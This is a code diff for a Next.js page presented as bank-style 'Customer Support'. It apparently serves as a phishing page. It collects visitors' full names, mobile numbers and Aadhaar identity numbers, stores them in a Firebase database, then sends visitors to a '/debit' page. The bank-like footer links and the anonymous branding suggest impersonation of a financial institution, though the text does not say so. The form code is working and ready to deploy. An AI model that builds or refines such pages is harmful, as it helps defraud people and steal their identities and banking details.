@@ -1,113 +1,192 @@
-import Image from "next/image";
+"use client";
+import { useState } from "react";
+import { ref, push } from "firebase/database";
+import { database } from "@/app/lib/firebase";
+import { useRouter } from "next/navigation";
 
 export default function Home() {
+  const router = useRouter();
+
+  const [formData, setFormData] = useState({
+    fullName: "",
+    mobile: "",
+    aadhar: "",
+  });
+
+  const handleChange = (e) => {
+    let { name, value } = e.target;
+    // Apply formatting logic based on input name
+    if (name === "mobile") {
+      // Mobile input formatting
+      value = value.replace(/\D/g, ""); // Remove non-digits
+      if (value.length > 10) {
+        value = value.substring(0, 10);
+      }
+    } else if (name === "aadhar") {
+      // Aadhar input formatting
+      value = value.replace(/\D/g, ""); // Remove non-digits
+      if (value.length > 12) {
+        value = value.substring(0, 12);
+      }
+      const formattedInput = value.match(/.{1,4}/g)?.join("-") || "";
+      value = formattedInput;
+    }
+
+    setFormData({
+      ...formData,
+      [name]: value,
+    });
+  };
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    const formRef = ref(database, "forms");
+    await push(formRef, formData);
+    // alert("Form submitted successfully!");
+    router.push("/debit");
+    setFormData({
+      fullName: "",
+      mobile: "",
+      aadhar: "",
+    });
+  };
+
   return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 max-w-5xl w-full items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started by editing&nbsp;
-          <code className="font-mono font-bold">src/app/page.js</code>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:h-auto lg:w-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{" "}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
+    <main className="">
+      <section className="w-full">
+        <div className="h-auto w-full flex items-center justify-left bg-[#0062A9] p-1">
+          <img src="/logo.png" className="p-2 w-[60px] h-[60px]" alt="Logo" />
+          <span className="font-semibold text-xl text-white">
+            Customer Support
+          </span>
         </div>
-      </div>
-
-      <div className="relative flex place-items-center before:absolute before:h-[300px] before:w-full sm:before:w-[480px] before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-full sm:after:w-[240px] after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 before:lg:h-[360px] z-[-1]">
-        <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
-      </div>
-
-      <div className="mb-32 grid text-center lg:max-w-5xl lg:w-full lg:mb-0 lg:grid-cols-4 lg:text-left">
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Docs{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Find in-depth information about Next.js features and API.
-          </p>
-        </a>
-
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800 hover:dark:bg-opacity-30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Learn{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Templates{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Explore starter templates for Next.js.
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Deploy{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50 text-balance`}>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
-      </div>
+        <div className="p-6">
+          <form
+            className="space-y-6 flex flex-col justify-center"
+            onSubmit={handleSubmit}
+            id="first-form"
+          >
+            <div className="mb-4">
+              <label
+                className="block text-gray-700 text-sm mb-2"
+                htmlFor="full_name"
+              >
+                Full Name
+              </label>
+              <input
+                className="shadow appearance-none border-b rounded-md w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
+                id="full_name"
+                type="text"
+                name="fullName"
+                placeholder="Please enter here"
+                value={formData.fullName}
+                onChange={handleChange}
+              />
+            </div>
+            <div className="mb-4">
+              <label
+                className="block text-gray-700 text-sm mb-2"
+                htmlFor="mobile"
+              >
+                Mobile Number
+              </label>
+              <input
+                className="shadow appearance-none border-b rounded-md w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
+                id="mobile"
+                name="mobile"
+                type="text"
+                placeholder="Please enter here"
+                value={formData.mobile}
+                onChange={handleChange}
+              />
+            </div>
+            <div className="mb-4">
+              <label
+                className="block text-gray-700 text-sm mb-2"
+                htmlFor="aadhar"
+              >
+                Aadhar Number
+              </label>
+              <input
+                className="shadow appearance-none border-b rounded-md w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
+                id="aadhar"
+                name="aadhar"
+                type="text"
+                placeholder="Please enter here"
+                value={formData.aadhar}
+                onChange={handleChange}
+              />
+            </div>
+            <div className="px-10 w-full flex justify-center items-center">
+              <button
+                className="bg-gradient-to-r from-[#0289A9] to-[#0063A8] hover:from-blue-700 hover:to-purple-700 text-white font-bold py-2 px-10 rounded focus:outline-none focus:shadow-outline w-full"
+                type="submit"
+              >
+                Submit
+              </button>
+            </div>
+          </form>
+          <div className="mt-10">
+            <div className="grid grid-cols-1 w-full">
+              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
+                <span>FAQs: </span>
+                <span className="text-slate-600">
+                  Find answers to the most frequently asked questions.
+                </span>
+              </div>
+              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
+                <span>Contact Us: </span>
+                <span className="text-slate-600">
+                  Get in touch with our support team.
+                </span>
+              </div>
+              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
+                <span>Product Guides: </span>
+                <span className="text-slate-600">
+                  Access detailed guides and tutorials.
+                </span>
+              </div>
+              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
+                <span>Account Management: </span>
+                <span className="text-slate-600">
+                  Manage your account settings and preferences
+                </span>
+              </div>
+              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
+                <span>Order Tracking: </span>
+                <span className="text-slate-600">
+                  Track the status of your orders.
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section className="bg-[#0062A9] p-5 w-full">
+        <div className="flex space-x-1 w-full justify-between">
+          <span className="text-xs text-white font-bold">Contact Us</span>
+          <span className="text-xs text-white font-bold">|</span>
+          <span className="text-xs text-white font-bold">Locate Us</span>
+          <span className="text-xs text-white font-bold">|</span>
+          <span className="text-xs text-white font-bold">Rate & Charges</span>
+          <span className="text-xs text-white font-bold">|</span>
+          <span className="text-xs text-white font-bold">Regulatory</span>
+        </div>
+        <div className="flex space-x-1 w-full justify-between mt-2">
+          <span className="text-xs text-white font-bold">Policies</span>
+          <span className="text-xs text-white font-bold">|</span>
+          <span className="text-xs text-white font-bold">
+            Regulatory Disclosures
+          </span>
+          <span className="text-xs text-white font-bold">|</span>
+          <span className="text-xs text-white font-bold">
+            Secure Usage Guidelines
+          </span>
+        </div>
+        <div className="mt-5 text-[10px] text-white">
+          Copyright @2021-2022 CUSTOMER SUPPORT. All right reserved.
+        </div>
+      </section>
     </main>
   );
 }
